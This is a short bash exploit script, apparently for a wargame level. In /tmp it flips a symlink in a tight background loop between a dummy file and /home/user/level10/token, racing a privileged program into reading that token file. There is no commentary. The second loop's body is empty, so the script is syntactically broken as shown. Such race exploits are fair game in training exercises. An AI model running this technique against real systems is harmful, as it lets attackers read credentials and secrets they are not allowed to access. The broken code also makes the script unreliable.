#!/bin/bash


cd /tmp
rm -f lnk
rm -f test
touch lnk
touch test
for i in $(seq 1 1000000); do
    ln -sf test lnk 
    ln -sf /home/user/level10/token lnk 
done &


for i in $(seq 1 50000); do
    
done 